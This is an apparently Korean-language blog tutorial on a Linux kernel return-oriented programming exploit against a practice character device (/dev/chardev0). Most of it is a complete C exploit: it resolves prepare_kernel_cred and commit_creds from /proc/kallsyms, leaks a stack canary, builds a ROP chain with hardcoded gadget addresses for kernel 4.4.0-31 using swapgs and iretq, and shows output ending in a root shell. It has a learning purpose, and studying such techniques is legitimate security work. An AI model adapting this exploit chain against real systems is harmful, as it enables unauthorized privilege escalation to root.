---
title: Return-Oriented Programming
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, return-oriented programming]
math: true
mermaid: true
---

## Set environment

x64_return_to_user에서 사용한 환경과 동일하다.

## Exploit plan

1. prepare_kernel_cred() 함수의 인자 값으로 ’0’을 전달
2. commit_creds() 함수의 인자 값으로 1.에서 리턴한 값을 전달
3. system() 함수를 이용해 “/bin/sh" 실행

```c
commit_creds(prepare_kernel_cred(NULL));
system("/bin/sh");
```

## ROP chainning

필요한 가젯들을 확인한다.

```
prepare_kernel_cred() 
commit_creds()
"pop rdi"
"mov rdi, rax"
"swapgs"
"iretq"
```

swapgs

```
ffffffff810613d4:   0f 01 f8                swapgs 
ffffffff810613d7:   5d                      pop    %rbp
ffffffff810613d8:   c3                      retq 
```

iretq

```
root@bs-virtual-machine:~# objdump -d ./vmlinux-4.4.0-31-generic | grep iretq
ffffffff817f7a97:   48 cf                   iretq  
```

## Exploit code

```c
//gcc -static -o test test.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
   
#define TEXT_LEN 64

unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); 

struct trap_frame {
    void *user_rip ;        // instruction pointer
    uint64_t user_cs ;      // code segment
    uint64_t user_rflags ;  // CPU flags
    void *user_rsp ;        // stack pointer
    uint64_t user_ss ;      // stack segment
} __attribute__((packed));
struct trap_frame tf;
  
void getShell(void) {
    execl("/bin/sh", "sh", NULL);
}
    
void prepare_tf(void) {
    asm("mov tf+8, cs;"
        "pushf; pop tf+16;"
        "mov tf+24, rsp;"
        "mov tf+32, ss;"
        );
    tf.user_rip = &getShell ;
}
  
unsigned long kallsyms_getaddr(const char* str){
    FILE *fp;
    char buf[128];
    char sym[128];
    char addr[32];

    if((fp=fopen("/proc/kallsyms","r")) < 0){
        perror("fopen() error");
    }

    while(fgets(buf,256,fp) != NULL){
        memset(addr,0x0,sizeof(addr));
        memset(sym,0x0,sizeof(sym));
        sscanf(buf,"%s %*s %s",addr,sym);
        if(strcmp(str,sym)==0){
            printf("%s : %s\n",sym,addr);   
            return strtoul(addr, NULL, 16);
        }
    }

    if(fclose(fp)<0){
        perror("fclose error");
    }
    return 0;   
}
   
int main()
{
    char buf[128];
    unsigned char canary[8];
    unsigned long rop[256]={NULL};

    int fd;

    prepare_kernel_cred = kallsyms_getaddr("prepare_kernel_cred");
    if(prepare_kernel_cred == 0){
    printf("prepare kernel cred not found\n");
    exit(0);
    }
    printf("prepare_kernel_cred: %p\n",prepare_kernel_cred);

    if((commit_creds = kallsyms_getaddr("commit_creds"))==0){
    printf("prepare kernel cred not found\n");
    exit(0);
    }
    printf("commit_creds: %p\n",commit_creds);

    
    if ((fd = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }
    
    memset (buf, 'A', TEXT_LEN);
   
    lseek(fd,0x40,SEEK_CUR);
    read(fd, buf, TEXT_LEN);
    //printf("%s", buf);

    memcpy(canary,buf,0x8);
    printf("canary: 0x%x%x%x%x\n",canary[3]&0xff,canary[2]&0xff,canary[1]&0xff,canary[0]&0xff);
    
    
    prepare_tf();
    rop[8] = *(unsigned long*)canary;
    rop[12] = 0xffffffff813e223f;  // pop rdi
    rop[13] = 0;
    rop[14] = prepare_kernel_cred;
    rop[15] = 0xffffffff8112d952; // pop rdx ;
    rop[16] = commit_creds;
    rop[17] = 0xffffffff817e9e92; // mov rdi,rax ; call rdx ; pop ; ret ;
    rop[19] = 0xffffffff810613d4; // swapgs ; pop rbp ; retq
    rop[21] = 0xffffffff817f7a97; // iretq
    rop[22] = tf.user_rip;
    rop[23] = tf.user_cs;
    rop[24] = tf.user_rflags;
    rop[25] = tf.user_rsp;
    rop[26] = tf.user_ss;

    write(fd,rop,sizeof(rop));
    
    if (close(fd) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}
```

## Exploit

```bash
bs@bs-virtual-machine:~/Desktop$ ./test 
prepare_kernel_cred : ffffffff8109da40
prepare_kernel_cred: 0xffffffff8109da40
commit_creds : ffffffff8109d760
commit_creds: 0xffffffff8109d760
canary: 0x2033ff68
# id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [03.Stack smashing(64bit) & ROP](https://www.lazenca.net/pages/viewpage.action?pageId=25624746)